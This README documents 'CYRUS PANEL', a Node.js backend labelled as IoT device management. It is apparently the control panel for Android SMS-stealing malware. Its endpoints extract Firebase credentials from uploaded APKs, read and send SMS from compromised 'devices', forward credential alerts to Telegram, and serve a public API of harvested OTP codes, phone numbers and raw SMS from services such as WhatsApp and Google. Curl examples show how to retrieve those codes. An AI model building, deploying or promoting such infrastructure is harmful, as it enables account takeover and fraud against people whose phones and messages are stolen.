# CYRUS PANEL – Full-Featured Backend

A production-ready **Node.js + Express** backend for the CYRUS PANEL IoT device management system, with authentication, user profiles, Firebase connection management, and a public OTP API.

## Features

- ✅ **Authentication** – Register, login, JWT sessions, secure cookies
- ✅ **User Profiles** – Profile management, API key generation, password change
- ✅ **Firebase Connections** – Add/manage multiple Firebase DB URLs & secret keys per user
- ✅ **OTP API** – Public endpoint returning OTP codes, phone numbers & raw SMS from connected databases
- ✅ **Device Management** – Full CRUD for IoT devices via Firebase proxy
- ✅ **APK Parser** – Upload APK files to extract Firebase credentials
- ✅ **Telegram Notifications** – Credential alerts via Telegram Bot API
- ✅ **Security** – Helmet, rate limiting, bcrypt passwords, JWT tokens, input validation
- ✅ **Clean Architecture** – Modular services, routes, middleware

## Quick Start

```bash
# 1. Install dependencies
npm install

# 2. Set up environment
cp .env.example .env
# Edit .env with your settings (SESSION_SECRET, TG_BOT_TOKEN, etc.)

# 3. Build static frontend
npm run build

# 4. Start the server
npm start
# Server runs at http://localhost:3000
```

## Pages

| Route | Description |
|-------|-------------|
| `/login/` | Login page |
| `/register/` | Create account page |
| `/dashboard/` | Main panel dashboard |
| `/connections/` | Manage Firebase database connections |
| `/profile/` | User profile, API key, password change |
| `/` | Panel home (original React app) |

## API Endpoints

### Authentication
| Method | Endpoint | Auth | Description |
|--------|----------|------|-------------|
| POST | `/api/auth/register` | — | Create account `{username, email, password}` |
| POST | `/api/auth/login` | — | Login `{login, password}` |
| POST | `/api/auth/logout` | — | Clear session |
| GET | `/api/auth/me` | ✅ | Get current user |
| PUT | `/api/auth/password` | ✅ | Change password |

### Profile
| Method | Endpoint | Auth | Description |
|--------|----------|------|-------------|
| GET | `/api/profile` | ✅ | Get profile + stats |
| PUT | `/api/profile` | ✅ | Update profile `{email, phone, bio}` |
| POST | `/api/profile/regenerate-key` | ✅ | Regenerate API key |

### Firebase Connections
| Method | Endpoint | Auth | Description |
|--------|----------|------|-------------|
| GET | `/api/connections` | ✅ | List all connections (masked keys) |
| POST | `/api/connections` | ✅ | Add connection `{name, url, key}` |
| GET | `/api/connections/:id` | ✅ | Get single connection |
| PUT | `/api/connections/:id` | ✅ | Update connection |
| DELETE | `/api/connections/:id` | ✅ | Remove connection |
| POST | `/api/connections/:id/test` | ✅ | Test Firebase connection |

### OTP API (like numberpanel.tech)
| Method | Endpoint | Auth | Description |
|--------|----------|------|-------------|
| GET | `/api/otp?count=10` | Optional | Get OTP codes from all connected databases |
| GET | `/api/otp/stats` | — | Get API statistics |

**Response format:**
```json
[
  ["WhatsApp", "919876543210", "Your WhatsApp code 123-456", "2026-08-13 12:00:00", " India"],
  ["Google", "14155551234", "G-123456 is your verification code", "2026-08-13 11:59:00", " USA/Canada"]
]
```

Each entry: `[service, phone_number, raw_sms, timestamp, country]`

### Firebase Proxy
| Method | Endpoint | Auth | Description |
|--------|----------|------|-------------|
| POST | `/api/firebase/read` | — | Read from Firebase `{url, key, path}` |
| POST | `/api/firebase/write` | — | Write to Firebase `{url, key, path, data}` |
| POST | `/api/firebase/update` | — | Update Firebase data |
| POST | `/api/firebase/delete` | — | Delete Firebase data |

### Device Management
| Method | Endpoint | Auth | Description |
|--------|----------|------|-------------|
| POST | `/api/devices/list` | — | List all devices (normalized) |
| POST | `/api/devices/:id` | — | Get device details |
| POST | `/api/devices/:id/messages` | — | Get device SMS messages |
| POST | `/api/devices/:id/send-sms` | — | Queue SMS `{to, message}` |
| POST | `/api/devices/:id/delete` | — | Delete device |

### Other
| Method | Endpoint | Description |
|--------|----------|-------------|
| GET | `/api/health` | Server health check |
| POST | `/api/apk/parse` | Parse APK for Firebase creds (multipart) |
| POST | `/api/telegram/notify` | Send Telegram notification |

## Environment Variables

| Variable | Default | Description |
|----------|---------|-------------|
| `PORT` | `3000` | Server port |
| `NODE_ENV` | `development` | Environment mode |
| `SESSION_SECRET` | (default) | JWT signing secret — **change in production** |
| `TG_BOT_TOKEN` | | Telegram bot token |
| `TG_CHAT_ID` | | Telegram chat ID |
| `RATE_LIMIT_WINDOW_MS` | `900000` | Rate limit window (15 min) |
| `RATE_LIMIT_MAX_REQUESTS` | `100` | Max requests per window |
| `MAX_UPLOAD_SIZE_MB` | `50` | Max APK upload size |

## Project Structure

```
indianpanel/
├── server.js                     # Express app entry
├── package.json
├── .env.example
│
├── src/
│   ├── config/index.js           # Configuration
│   ├── database.js               # JSON-file database
│   │
│   ├── middleware/
│   │   ├── auth.js               # JWT & API key auth
│   │   ├── errorHandler.js       # Error handling
│   │   ├── rateLimiter.js        # Rate limiting
│   │   └── validate.js           # Input validation
│   │
│   ├── routes/
│   │   ├── api.js                # API router
│   │   ├── auth.js               # Auth routes
│   │   ├── connections.js        # Firebase connections CRUD
│   │   ├── devices.js            # Device management
│   │   ├── firebase.js           # Firebase proxy
│   │   ├── health.js             # Health check
│   │   ├── otp.js                # OTP API
│   │   ├── profile.js            # Profile management
│   │   ├── apk.js                # APK parsing
│   │   └── telegram.js           # Telegram notifications
│   │
│   ├── services/
│   │   ├── auth.js               # Auth (JWT, bcrypt, API keys)
│   │   ├── connections.js        # Connection management
│   │   ├── devices.js            # Device normalization
│   │   ├── firebase.js           # Firebase operations
│   │   ├── otpExtractor.js       # OTP code extraction
│   │   ├── phoneExtractor.js     # Phone number extraction
│   │   └── telegram.js           # Telegram Bot API
│   │
│   └── utils/
│       └── format.js             # Formatting utilities
│
├── public/                       # Static frontend (auto-built)
│   ├── index.html                # Main panel
│   ├── login/index.html          # Login page
│   ├── register/index.html       # Registration page
│   ├── profile/index.html        # Profile page
│   ├── connections/index.html    # Connections management
│   ├── assets/app.css            # Shared CSS
│   ├── js/                       # Client-side JS
│   └── route-assets/             # Route-specific assets
│
├── data/                         # JSON database files (gitignored)
└── scripts/
    └── build-frontend.js         # Frontend build script
```

## OTP API Usage

```bash
# Basic usage (returns latest 10 OTPs)
curl https://your-panel.com/api/otp?count=10

# Get 50 OTPs
curl https://your-panel.com/api/otp?count=50

# With API key (for higher rate limits)
curl https://your-panel.com/api/otp?count=10&key=cp_your_api_key

# Force fresh data (bypass 30s cache)
curl https://your-panel.com/api/otp?count=10&fresh=1

# Get stats
curl https://your-panel.com/api/otp/stats
```

## License

UNLICENSED – Private use only.
